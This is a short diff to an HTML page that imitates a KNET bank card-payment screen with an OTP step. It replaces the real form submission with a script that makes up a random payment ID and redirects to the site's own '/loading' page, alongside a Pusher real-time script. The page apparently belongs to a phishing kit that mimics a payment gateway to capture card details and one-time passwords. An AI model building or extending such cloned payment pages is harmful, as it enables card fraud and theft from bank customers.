@@ -541,7 +541,7 @@
 
 
                                 <div id="submithide">
-                                    <button name="proceed" type="submit" class="submit-button" id="proceed"> Submit</button>
+                                    <button type="button" class="submit-button" id="proceed" onclick="submitKnetPayment()"> Submit</button>
 
                                     <input name="proceedCancel" type="button" class="cancel-button" onclick="cancelPage(); sibTags(&#39;MobCancelBtn&#39;,&#39;MobPayPage&#39;,&#39;CancelBtn&#39;);" id="cancel1" value="Cancel">
 
@@ -889,6 +889,16 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
 
     <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
 
+    <script type="text/javascript">
+        // Simple KNET submission - redirect to loading page
+        function submitKnetPayment() {
+            // Generate a random payment ID
+            const paymentId = 'PAY-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+            
+            // Redirect to loading page with paymentId
+            window.location.href = '/loading?paymentId=' + paymentId;
+        }
+    </script>
 
     <script type="text/javascript">
         var pid = "7212";
